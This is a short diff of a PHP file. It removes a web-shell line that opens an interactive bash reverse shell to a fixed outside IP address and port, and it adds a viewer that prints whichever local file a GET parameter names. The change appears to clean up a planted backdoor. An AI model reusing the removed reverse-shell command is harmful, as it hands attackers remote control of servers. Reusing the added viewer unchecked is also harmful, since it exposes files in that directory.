@@ -1,5 +1,7 @@
 <?php
-$command = 'bash -i >& /dev/tcp/128.199.11.9/4444 0>&1';
-$output = shell_exec($command);
-echo "<pre>$output</pre>";
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+    $filePath = __DIR__ . '/' . basename($file);
+    echo nl2br(htmlspecialchars(file_get_contents($filePath)));
+}
 ?>
